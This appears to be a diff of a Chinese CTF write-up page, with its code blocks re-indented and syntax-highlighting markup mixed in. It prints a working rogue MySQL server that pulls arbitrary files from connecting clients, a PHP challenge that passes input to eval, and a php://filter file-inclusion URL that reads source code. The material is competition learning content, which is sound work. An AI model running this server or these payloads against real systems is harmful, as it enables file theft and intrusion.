-            <span class="token attr-name">header</span> <span class="token attr-value"><span class="token punctuation">=</span> mysql_packet.packet_header.pack(payload_len,</span> <span class="token attr-name">0,</span> <span class="token attr-name">self.packet_num)</span>
-        <span class="token attr-name"><span class="token namespace">else:</span></span>
-            <span class="token attr-name">header</span> <span class="token attr-value"><span class="token punctuation">=</span> mysql_packet.packet_header.pack(payload_len</span> <span class="token attr-name">&amp;</span> <span class="token attr-name">0xFFFF,</span> <span class="token attr-name">payload_len</span> <span class="token punctuation">&gt;</span></span>&gt; 16, 0, self.packet_num)
-
-        result = &quot;{0}{1}&quot;.format(
-            header,
-            self.payload
-        )
-        return result
-
-    def __repr__(self):
-        return repr(str(self))
-
-    @staticmethod
-    def parse(raw_data):
-        packet_num = ord(raw_data[0])
-        payload = raw_data[1:]
-
-        return mysql_packet(packet_num, payload)
-
-
-class http_request_handler(asynchat.async_chat):
-
-    def __init__(self, addr):
-        asynchat.async_chat.__init__(self, sock=addr[0])
-        self.addr = addr[1]
-        self.ibuffer = []
-        self.set_terminator(3)
-        self.state = &apos;LEN&apos;
-        self.sub_state = &apos;Auth&apos;
-        self.logined = False
-        self.push(
-            mysql_packet(
-                0,
-                &quot;&quot;.join((
-                    &apos;\x0a&apos;,  # Protocol
-                    &apos;5.6.28-0ubuntu0.14.04.1&apos; + &apos;\0&apos;,
-                    &apos;\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&apos;,
-                ))            )
-        )
-
-        self.order = 1
-        self.states = [&apos;LOGIN&apos;, &apos;CAPS&apos;, &apos;ANY&apos;]
-
-    def push(self, data):
-        log.debug(&apos;Pushed: %r&apos;, data)
-        data = str(data)
-        asynchat.async_chat.push(self, data)
-
-    def collect_incoming_data(self, data):
-        log.debug(&apos;Data recved: %r&apos;, data)
-        self.ibuffer.append(data)
-
-    def found_terminator(self):
-        data = &quot;&quot;.join(self.ibuffer)
-        self.ibuffer = []
-
-        if self.state == &apos;LEN&apos;:
-            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
-            if len_bytes &lt; 65536:
-                self.set_terminator(len_bytes)
-                self.state = &apos;Data&apos;
-            else:
-                self.state = &apos;MoreLength&apos;
-        elif self.state == &apos;MoreLength&apos;:
-            if data[0] != &apos;\0&apos;:
-                self.push(None)
-                self.close_when_done()
-            else:
-                self.state = &apos;Data&apos;
-        elif self.state == &apos;Data&apos;:
-            packet = mysql_packet.parse(data)
+        if os.fork(): os._exit(0)
+        os.setsid()
+        if os.fork(): os._exit(0)
+        os.umask(0o022)
+        null=os.open(&apos;/dev/null&apos;, os.O_RDWR)
+        for i in xrange(3):
             try:
-                if self.order != packet.packet_num:
-                    raise OutOfOrder()
-                else:
-                    # Fix ?
-                    self.order = packet.packet_num + 2
-                if packet.packet_num == 0:
-                    if packet.payload[0] == &apos;\x03&apos;:
-                        log.info(&apos;Query&apos;)
+                os.dup2(null, i)
+            except OSError as e:
+                if e.errno != 9: raise
+        os.close(null)
 
-                        filename = random.choice(filelist)
-                        PACKET = mysql_packet(
-                            packet,
-                            &apos;\xFB{0}&apos;.format(filename)
-                        )
-                        self.set_terminator(3)
-                        self.state = &apos;LEN&apos;
-                        self.sub_state = &apos;File&apos;
-                        self.push(PACKET)
-                    elif packet.payload[0] == &apos;\x1b&apos;:
-                        log.info(&apos;SelectDB&apos;)
-                        self.push(mysql_packet(
-                            packet,
-                            &apos;\xfe\x00\x00\x02\x00&apos;
-                        ))
-                        raise LastPacket()
-                    elif packet.payload[0] in &apos;\x02&apos;:
-                        self.push(mysql_packet(
-                            packet, &apos;\0\0\0\x02\0\0\0&apos;
-                        ))
-                        raise LastPacket()
-                    elif packet.payload == &apos;\x00\x01&apos;:
-                        self.push(None)
-                        self.close_when_done()
+
+    class LastPacket(Exception):
+        pass
+
+
+    class OutOfOrder(Exception):
+        pass
+
+
+    class mysql_packet(object):
+        packet_header = struct.Struct(&apos;&lt;Hbb&apos;)
+        packet_header_long = struct.Struct(&apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Hbbb&apos;)</span>
+        <span class="token attr-name">def</span> <span class="token attr-name">__init__(self,</span> <span class="token attr-name">packet_type,</span> <span class="token attr-name"><span class="token namespace">payload):</span></span>
+            <span class="token attr-name">if</span> <span class="token attr-name">isinstance(packet_type,</span> <span class="token attr-name"><span class="token namespace">mysql_packet):</span></span>
+                <span class="token attr-name">self.packet_num</span> <span class="token attr-value"><span class="token punctuation">=</span> packet_type.packet_num</span> <span class="token attr-name">+</span> <span class="token attr-name">1</span>
+            <span class="token attr-name"><span class="token namespace">else:</span></span>
+                <span class="token attr-name">self.packet_num</span> <span class="token attr-value"><span class="token punctuation">=</span> packet_type</span>
+            <span class="token attr-name">self.payload</span> <span class="token attr-value"><span class="token punctuation">=</span> payload</span>
+
+        <span class="token attr-name">def</span> <span class="token attr-name"><span class="token namespace">__str__(self):</span></span>
+            <span class="token attr-name">payload_len</span> <span class="token attr-value"><span class="token punctuation">=</span> len(self.payload)</span>
+            <span class="token attr-name">if</span> <span class="token attr-name">payload_len</span> <span class="token attr-name">&lt;</span> <span class="token attr-name"><span class="token namespace">65536:</span></span>
+                <span class="token attr-name">header</span> <span class="token attr-value"><span class="token punctuation">=</span> mysql_packet.packet_header.pack(payload_len,</span> <span class="token attr-name">0,</span> <span class="token attr-name">self.packet_num)</span>
+            <span class="token attr-name"><span class="token namespace">else:</span></span>
+                <span class="token attr-name">header</span> <span class="token attr-value"><span class="token punctuation">=</span> mysql_packet.packet_header.pack(payload_len</span> <span class="token attr-name">&amp;</span> <span class="token attr-name">0xFFFF,</span> <span class="token attr-name">payload_len</span> <span class="token punctuation">&gt;</span></span>&gt; 16, 0, self.packet_num)
+
+            result = &quot;{0}{1}&quot;.format(
+                header,
+                self.payload
+            )
+            return result
+
+        def __repr__(self):
+            return repr(str(self))
+
+        @staticmethod
+        def parse(raw_data):
+            packet_num = ord(raw_data[0])
+            payload = raw_data[1:]
+
+            return mysql_packet(packet_num, payload)
+
+
+    class http_request_handler(asynchat.async_chat):
+
+        def __init__(self, addr):
+            asynchat.async_chat.__init__(self, sock=addr[0])
+            self.addr = addr[1]
+            self.ibuffer = []
+            self.set_terminator(3)
+            self.state = &apos;LEN&apos;
+            self.sub_state = &apos;Auth&apos;
+            self.logined = False
+            self.push(
+                mysql_packet(
+                    0,
+                    &quot;&quot;.join((
+                        &apos;\x0a&apos;,  # Protocol
+                        &apos;5.6.28-0ubuntu0.14.04.1&apos; + &apos;\0&apos;,
+                        &apos;\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&apos;,
+                    ))            )
+            )
+
+            self.order = 1
+            self.states = [&apos;LOGIN&apos;, &apos;CAPS&apos;, &apos;ANY&apos;]
+
+        def push(self, data):
+            log.debug(&apos;Pushed: %r&apos;, data)
+            data = str(data)
+            asynchat.async_chat.push(self, data)
+
+        def collect_incoming_data(self, data):
+            log.debug(&apos;Data recved: %r&apos;, data)
+            self.ibuffer.append(data)
+
+        def found_terminator(self):
+            data = &quot;&quot;.join(self.ibuffer)
+            self.ibuffer = []
+
+            if self.state == &apos;LEN&apos;:
+                len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
+                if len_bytes &lt; 65536:
+                    self.set_terminator(len_bytes)
+                    self.state = &apos;Data&apos;
+                else:
+                    self.state = &apos;MoreLength&apos;
+            elif self.state == &apos;MoreLength&apos;:
+                if data[0] != &apos;\0&apos;:
+                    self.push(None)
+                    self.close_when_done()
+                else:
+                    self.state = &apos;Data&apos;
+            elif self.state == &apos;Data&apos;:
+                packet = mysql_packet.parse(data)
+                try:
+                    if self.order != packet.packet_num:
+                        raise OutOfOrder()
                     else:
-                        raise ValueError()
-                else:
-                    if self.sub_state == &apos;File&apos;:
-                        log.info(&apos;-- result&apos;)
-                        log.info(&apos;Result: %r&apos;, data)
+                        # Fix ?
+                        self.order = packet.packet_num + 2
+                    if packet.packet_num == 0:
+                        if packet.payload[0] == &apos;\x03&apos;:
+                            log.info(&apos;Query&apos;)
 
-                        if len(data) == 1:
-                            self.push(
-                                mysql_packet(packet, &apos;\0\0\0\x02\0\0\0&apos;)
+                            filename = random.choice(filelist)
+                            PACKET = mysql_packet(
+                                packet,
+                                &apos;\xFB{0}&apos;.format(filename)
                             )
-                            raise LastPacket()
-                        else:
                             self.set_terminator(3)
                             self.state = &apos;LEN&apos;
-                            self.order = packet.packet_num + 1
-
-                    elif self.sub_state == &apos;Auth&apos;:
-                        self.push(mysql_packet(
-                            packet, &apos;\0\0\0\x02\0\0\0&apos;
-                        ))
-                        raise LastPacket()
+                            self.sub_state = &apos;File&apos;
+                            self.push(PACKET)
+                        elif packet.payload[0] == &apos;\x1b&apos;:
+                            log.info(&apos;SelectDB&apos;)
+                            self.push(mysql_packet(
+                                packet,
+                                &apos;\xfe\x00\x00\x02\x00&apos;
+                            ))
+                            raise LastPacket()
+                        elif packet.payload[0] in &apos;\x02&apos;:
+                            self.push(mysql_packet(
+                                packet, &apos;\0\0\0\x02\0\0\0&apos;
+                            ))
+                            raise LastPacket()
+                        elif packet.payload == &apos;\x00\x01&apos;:
+                            self.push(None)
+                            self.close_when_done()
+                        else:
+                            raise ValueError()
                     else:
-                        log.info(&apos;-- else&apos;)
-                        raise ValueError(&apos;Unknown packet&apos;)
-            except LastPacket:
-                log.info(&apos;Last packet&apos;)
-                self.state = &apos;LEN&apos;
-                self.sub_state = None
-                self.order = 0
-                self.set_terminator(3)
-            except OutOfOrder:
-                log.warning(&apos;Out of order&apos;)
-                self.push(None)
+                        if self.sub_state == &apos;File&apos;:
+                            log.info(&apos;-- result&apos;)
+                            log.info(&apos;Result: %r&apos;, data)
+
+                            if len(data) == 1:
+                                self.push(
+                                    mysql_packet(packet, &apos;\0\0\0\x02\0\0\0&apos;)
+                                )
+                                raise LastPacket()
+                            else:
+                                self.set_terminator(3)
+                                self.state = &apos;LEN&apos;
+                                self.order = packet.packet_num + 1
+
+                        elif self.sub_state == &apos;Auth&apos;:
+                            self.push(mysql_packet(
+                                packet, &apos;\0\0\0\x02\0\0\0&apos;
+                            ))
+                            raise LastPacket()
+                        else:
+                            log.info(&apos;-- else&apos;)
+                            raise ValueError(&apos;Unknown packet&apos;)
+                except LastPacket:
+                    log.info(&apos;Last packet&apos;)
+                    self.state = &apos;LEN&apos;
+                    self.sub_state = None
+                    self.order = 0
+                    self.set_terminator(3)
+                except OutOfOrder:
+                    log.warning(&apos;Out of order&apos;)
+                    self.push(None)
+                    self.close_when_done()
+            else:
+                log.error(&apos;Unknown state&apos;)
+                self.push(&apos;None&apos;)
                 self.close_when_done()
-        else:
-            log.error(&apos;Unknown state&apos;)
-            self.push(&apos;None&apos;)
-            self.close_when_done()
 
 
-class mysql_listener(asyncore.dispatcher):
-    def __init__(self, sock=None):
-        asyncore.dispatcher.__init__(self, sock)
+    class mysql_listener(asyncore.dispatcher):
+        def __init__(self, sock=None):
+            asyncore.dispatcher.__init__(self, sock)
 
-        if not sock:
-            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.set_reuse_addr()
-            try:
-                self.bind((&apos;&apos;, PORT))
-            except socket.error:
-                exit()
+            if not sock:
+                self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.set_reuse_addr()
+                try:
+                    self.bind((&apos;&apos;, PORT))
+                except socket.error:
+                    exit()
 
-            self.listen(5)
+                self.listen(5)
 
-    def handle_accept(self):
-        pair = self.accept()
+        def handle_accept(self):
+            pair = self.accept()
 
-        if pair is not None:
-            log.info(&apos;Conn from: %r&apos;, pair[1])
-            tmp = http_request_handler(pair)
+            if pair is not None:
+                log.info(&apos;Conn from: %r&apos;, pair[1])
+                tmp = http_request_handler(pair)
 
-z = mysql_listener()
-# daemonize()
-asyncore.loop()
+    z = mysql_listener()
+    # daemonize()
+    asyncore.loop()
 </code></pre><p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555776204798ec202699ea631618b84d62535eb82.png" alt=""></p>
 <p>13&#x3001;&#x5728;&#x9875;&#x9762;&#x4E0A;&#x586B;&#x597D;&#x4FE1;&#x606F;&#xFF0C;&#x70B9;&#x63D0;&#x4EA4;&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555776257d139b1e5f091c62bc0ed59ff230fbc1a-1024x442.png" alt=""></p>
@@ -1046,34 +1047,34 @@ asyncore.loop()
 <p>3&#x3001;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x76F4;&#x63A5;&#x63D0;&#x4EA4;&#x7ED9; calc.php &#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x8BBF;&#x95EE;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x770B;&#x770B;&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555858379f1e2e177148d82481d30ff53c5f9e177-1024x520.png" alt=""></p>
 <p>4&#x3001;&#x6E90;&#x7801;&#x51FA;&#x6765;&#x4E86;&#x3002;</p>
-<pre class="language-"><code>&lt;?php
-error_reporting(0);
-//&#x542C;&#x8BF4;&#x4F60;&#x5F88;&#x559C;&#x6B22;&#x6570;&#x5B66;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x4F60;&#x662F;&#x5426;&#x7231;&#x5B83;&#x80DC;&#x8FC7;&#x7231;flag
-if(!isset($_GET[&apos;c&apos;])){
-    show_source(__FILE__);
-}else{
-    //&#x4F8B;&#x5B50; c=20-1
-    $content = $_GET[&apos;c&apos;];
-    if (strlen($content) &gt;= 80) {
-        die(&quot;&#x592A;&#x957F;&#x4E86;&#x4E0D;&#x4F1A;&#x7B97;&quot;);
-    }
-    $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;];
-    foreach ($blacklist as $blackitem) {
-        if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) {
-            die(&quot;&#x8BF7;&#x4E0D;&#x8981;&#x8F93;&#x5165;&#x5947;&#x5947;&#x602A;&#x602A;&#x7684;&#x5B57;&#x7B26;&quot;);
+<pre class="language-"><code>    &lt;?php
+    error_reporting(0);
+    //&#x542C;&#x8BF4;&#x4F60;&#x5F88;&#x559C;&#x6B22;&#x6570;&#x5B66;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x4F60;&#x662F;&#x5426;&#x7231;&#x5B83;&#x80DC;&#x8FC7;&#x7231;flag
+    if(!isset($_GET[&apos;c&apos;])){
+        show_source(__FILE__);
+    }else{
+        //&#x4F8B;&#x5B50; c=20-1
+        $content = $_GET[&apos;c&apos;];
+        if (strlen($content) &gt;= 80) {
+            die(&quot;&#x592A;&#x957F;&#x4E86;&#x4E0D;&#x4F1A;&#x7B97;&quot;);
         }
-    }
-    //&#x5E38;&#x7528;&#x6570;&#x5B66;&#x51FD;&#x6570;http://www.w3school.com.cn/php/php_ref_math.asp
-    $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];
-    preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs);
-    foreach ($used_funcs[0] as $func) {
-        if (!in_array($func, $whitelist)) {
-            die(&quot;&#x8BF7;&#x4E0D;&#x8981;&#x8F93;&#x5165;&#x5947;&#x5947;&#x602A;&#x602A;&#x7684;&#x51FD;&#x6570;&quot;);
+        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;];
+        foreach ($blacklist as $blackitem) {
+            if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) {
+                die(&quot;&#x8BF7;&#x4E0D;&#x8981;&#x8F93;&#x5165;&#x5947;&#x5947;&#x602A;&#x602A;&#x7684;&#x5B57;&#x7B26;&quot;);
+            }
         }
+        //&#x5E38;&#x7528;&#x6570;&#x5B66;&#x51FD;&#x6570;http://www.w3school.com.cn/php/php_ref_math.asp
+        $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];
+        preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs);
+        foreach ($used_funcs[0] as $func) {
+            if (!in_array($func, $whitelist)) {
+                die(&quot;&#x8BF7;&#x4E0D;&#x8981;&#x8F93;&#x5165;&#x5947;&#x5947;&#x602A;&#x602A;&#x7684;&#x51FD;&#x6570;&quot;);
+            }
+        }
+        //&#x5E2E;&#x4F60;&#x7B97;&#x51FA;&#x7B54;&#x6848;
+        eval(&apos;echo &apos;.$content.&apos;;&apos;);
     }
-    //&#x5E2E;&#x4F60;&#x7B97;&#x51FA;&#x7B54;&#x6848;
-    eval(&apos;echo &apos;.$content.&apos;;&apos;);
-}
 </code></pre><p>5&#x3001;&#x5BA1;&#x8BA1;&#x4E00;&#x4E0B;&#x6E90;&#x7801;&#x3002;</p>
 <p>&#x5148;&#x5224;&#x65AD; c &#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x6709;&#x6CA1;&#x6709;&#xFF0C;&#x6709;&#x7684;&#x8BDD;&#x5C31;&#x5224;&#x65AD;&#x957F;&#x5EA6;&#xFF0C;&#x5C0F;&#x4E8E; 80 &#x5B57;&#x8282;&#x5C31;&#x7EE7;&#x7EED;&#x5F80;&#x4E0B;&#x8D70;&#x3002;&#x7136;&#x540E;&#x62E6;&#x622A;&#x4E00;&#x5927;&#x5806;&#x7B26;&#x53F7;&#xFF0C;&#x518D;&#x5224;&#x65AD;&#x53C2;&#x6570;&#x91CC;&#x7684;&#x6587;&#x672C;&#x6BB5;&#x662F;&#x5426;&#x5728;&#x51FD;&#x6570;&#x767D;&#x540D;&#x5355;&#x5185;&#xFF0C;&#x90FD;&#x5728;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x3002;</p>
 <p>6&#x3001;&#x6765;&#x770B;&#x770B;&#x4ED6;&#x7684;&#x51FD;&#x6570;&#x8868;&#x5427;&#x3002;</p>
@@ -1107,138 +1108,150 @@ if(!isset($_GET[&apos;c&apos;])){
 <p>4&#x3001;&#x8BBF;&#x95EE; /?route=php://filter/convert.base64-encode/resource=app/index&#xFF0C;&#x80FD;&#x8BFB;&#x6E90;&#x7801;&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/15558608400e4d9aa9c020a1695d1f086bdc007bd1-1024x58.png" alt=""></p>
 <p>base64 &#x89E3;&#x7801;&#x4E0B;&#xFF0C;&#x62FF;&#x5230; index.php &#x7684;&#x6E90;&#x7801;&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
-if (!defined(&apos;LFI&apos;)) {
-    echo &quot;Include me!&quot;;
-    exit();
-}
-?&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+<pre class="language-"><code>    <span class="token prolog">&lt;?php
+    if (!defined(&apos;LFI&apos;)) {
+        echo &quot;Include me!&quot;;
+        exit();
+    }
+    ?&gt;</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
 
-    Hi CTFer,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
-    &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;SDK&#x670D;&#x52A1;&#xFF0C;&#x5B83;&#x7684;&#x4EFB;&#x52A1;&#x662F;&#x7ED9;&#x5404;&#x4F4D;&#x5927;&#x4F6C;<span class="token comment">&lt;!--&#x9F20;--&gt;</span>&#x63D0;&#x4F9B;flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
-    Powered by Aoisystem<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
-    <span class="token comment">&lt;!-- error_reporting(E_ALL); --&gt;</span>
+        Hi CTFer,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
+        &#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;SDK&#x670D;&#x52A1;&#xFF0C;&#x5B83;&#x7684;&#x4EFB;&#x52A1;&#x662F;&#x7ED9;&#x5404;&#x4F4D;&#x5927;&#x4F6C;<span class="token comment">&lt;!--&#x9F20;--&gt;</span>&#x63D0;&#x4F9B;flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
+        Powered by Aoisystem<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
+        <span class="token comment">&lt;!-- error_reporting(E_ALL); --&gt;</span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
 
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
 </code></pre><p>5&#x3001;&#x518D;&#x6765;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#xFF0C;&#x6BD4;&#x5982; flag&#xFF1F;</p>
 <p>/?route=app/flag</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/155586119349779eca4884fa361e8d6a56df21e24d-1024x160.png" alt=""></p>
 <p>flag.php &#x7684;&#x6E90;&#x7801;&#x3002;</p>
-<pre class="language-"><code>&lt;?php
-if (!defined(&apos;LFI&apos;)) {
-    echo &quot;Include me!&quot;;
-    exit();
-}
-use interesting\FlagSDK;
-$sdk = new FlagSDK();
-$key = $_GET[&apos;key&apos;] ?? false;
-if (!$key) {
-    echo &quot;Please provide access key<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token attr-name">\</span><span class="token punctuation">&gt;</span></span>&quot;;
-    echo &apos;$_GET[&quot;key&quot;];&apos;;
-    exit();
-}
-$flag = $sdk-&gt;verify($key);
-if ($flag) {
-    echo $flag;
-} else {
-    echo &quot;Wrong Key&quot;;
-    exit();
-}
-//Do you want to know more about this SDK?
-//we &apos;accidentally&apos; save a backup.zip for more information
+<pre class="language-"><code>    &lt;?php
+    if (!defined(&apos;LFI&apos;)) {
+        echo &quot;Include me!&quot;;
+        exit();
+    }
+    use interesting\FlagSDK;
+    $sdk = new FlagSDK();
+    $key = $_GET[&apos;key&apos;] ?? false;
+    if (!$key) {
+        echo &quot;Please provide access key<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token attr-name">\</span><span class="token punctuation">&gt;</span></span>&quot;;
+        echo &apos;$_GET[&quot;key&quot;];&apos;;
+        exit();
+    }
+    $flag = $sdk-&gt;verify($key);
+    if ($flag) {
+        echo $flag;
+    } else {
+        echo &quot;Wrong Key&quot;;
+        exit();
+    }
+    //Do you want to know more about this SDK?
+    //we &apos;accidentally&apos; save a backup.zip for more information
 </code></pre><p>6&#x3001;&#x63D0;&#x793A;&#x6709;&#x4E2A; backup.zip&#xFF0C;&#x4E0B;&#x4E0B;&#x6765;&#x770B;&#x770B;&#xFF0C;&#x662F;&#x4E9B;&#x63D0;&#x793A;&#x3002;</p>
 <p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555861323c780b1d8aaeb6c6e12b112f3753df6f0-1024x623.png" alt=""></p>
 <pre class="language-"><code>&#x6211;&#x4EEC;&#x7684;SDK&#x901A;&#x8FC7;&#x5982;&#x4E0B;SHA1&#x7B97;&#x6CD5;&#x9A8C;&#x8BC1;key&#x662F;&#x5426;&#x6B63;&#x786E;:
-
-public function verify($key)
-{
-    if (sha1($key) === $this-&gt;getHash()) {
-        return &quot;too{young-too-simple}&quot;;
+</code></pre><pre class="language-"><code>    public function verify($key)
+    {
+        if (sha1($key) === $this-&gt;getHash()) {
+            return &quot;too{young-too-simple}&quot;;
+        }
+        return false;
     }
-    return false;
-}
 
-&#x5982;&#x679C;&#x6B63;&#x786E;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x7684;SDK&#x4F1A;&#x8FD4;&#x56DE;flag&#x3002;
+    &#x5982;&#x679C;&#x6B63;&#x786E;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x7684;SDK&#x4F1A;&#x8FD4;&#x56DE;flag&#x3002;
 
-PS: &#x4E3A;&#x4E86;&#x8282;&#x7701;&#x5404;&#x4F4D;&#x5927;&#x4F6C;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x7279;&#x6CE8;&#x660E;
